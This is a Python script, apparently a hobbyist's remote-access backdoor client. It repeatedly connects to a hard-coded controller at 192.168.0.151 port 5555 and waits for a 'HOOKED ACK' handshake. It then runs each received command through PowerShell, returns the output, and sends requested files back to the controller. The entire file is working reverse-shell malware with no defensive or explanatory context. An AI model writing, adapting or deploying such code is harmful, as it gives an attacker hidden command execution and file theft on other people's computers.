import json
import socket
import time
import os
import subprocess


# send command to target system
def reliable_send(command):
    jsondata = json.dumps(command)
    # send the command
    sock.send(jsondata.encode())


# send command to target system
def reliable_receive():
    data = ""
    while True:
        try:
            data = data + sock.recv(6024).decode().rstrip()
            return json.loads(data)
        except:
            pass


def upload_file(file_name):
    f = open(file_name, "rb")
    filecontent = f.read().decode()
    print(filecontent)
    reliable_send(filecontent)
    f.close()


def connection():
    while True:
        print("[+] TRYING TO CONNECT...............")
        try:
            # connect the client to our server
            sock.connect(("192.168.0.151", 5555))
            # if connection sucess full
            while True:
                command = reliable_receive()
                print(command)

                if command == "HOOKED ACK 🪝":
                    reliable_send("FROM CLIENT:" + command)
                    continue
                # reliable_send("From Client:" + command)
                if command == "quit":
                    os._exit(0)
                elif command[0:3] == "cd ":
                    print("[+] changing directory")
                    os.chdir(command[3:])
                    continue
                elif command[:8] == "download":
                    upload_file(command[9:])
                    pass
                else:
                    # clear the buffer
                    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
                    # execute command
                    execute = subprocess.Popen(
                        ["powershell.exe", command],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    result = execute.stdout.read() + execute.stderr.read()
                    # already an encoded data hence try to decode it
                    result = result.decode()
                    reliable_send(result)
                    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
        except:
            print("[-] connection failed")
            time.sleep(10)
            connection()


# first argument tells to connect over ipv4 and second argument tells using tcp protocol
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
